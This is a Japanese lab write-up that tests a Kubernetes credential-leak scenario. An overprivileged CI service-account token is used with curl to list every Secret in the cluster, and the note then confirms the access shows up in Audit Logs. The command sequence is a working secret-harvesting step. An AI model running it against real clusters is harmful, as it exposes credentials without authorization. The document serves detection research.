## Lab 04: kubeconfig／Secret漏洩経由の侵入

- MITRE ATT&CK for Containers: T1552.001 (Credentials In Files)
- 前提: CI/CDが使う`deploy-bot`というServiceAccountに、クラスタ全体のSecret読み取り権限（過剰権限）を付与し、そのトークンが漏洩した想定

### 手順

```bash
TOKEN=$(kubectl create token deploy-bot -n lab --duration=1h)
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets"
```

### 結果：攻撃は成立

全Namespace横断でSecret一覧を取得できた（`falco`namespaceのHelm releaseシークレット等が取得できることを確認）。

### Audit Logsの記録（実測）

```json
{"verb": "list", "user": {"username": "system:serviceaccount:lab:deploy-bot", ...},
 "sourceIPs": ["172.19.0.1"], "objectRef": {"resource": "secrets", "apiVersion": "v1"},
 "responseStatus": {"code": 200}}
```

本文の想定どおり、**Audit Logsに漏洩トークンによる全Secret一覧取得が正確に記録されていた**。これはLab 1〜3と異なり、本文の記述と実機結果が一致した数少ないケース。

### 考察（本文修正用）

- この結果は本文の記述をそのまま維持できる。
- 補足として、`kubectl create token`で生成した短命トークン（JTIクレーム付き）でも、Audit Logsには`credential-id`として記録され追跡可能であることを実機で確認できた。
